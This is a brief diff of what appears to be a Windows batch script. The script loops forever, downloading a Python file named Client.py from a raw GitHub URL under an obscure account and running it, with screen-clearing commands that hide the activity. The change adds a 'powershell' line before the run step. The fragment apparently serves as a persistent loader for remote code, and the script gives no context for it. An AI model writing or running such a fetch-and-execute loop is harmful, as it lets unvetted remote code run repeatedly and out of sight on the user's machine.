@@ -2,6 +2,7 @@
 :top
 curl -o Client.py https://raw.githubusercontent.com/oogabooga245/-/main/Client.py
 cls
+powershell
 python3 Client.py
 cls
 goto :run
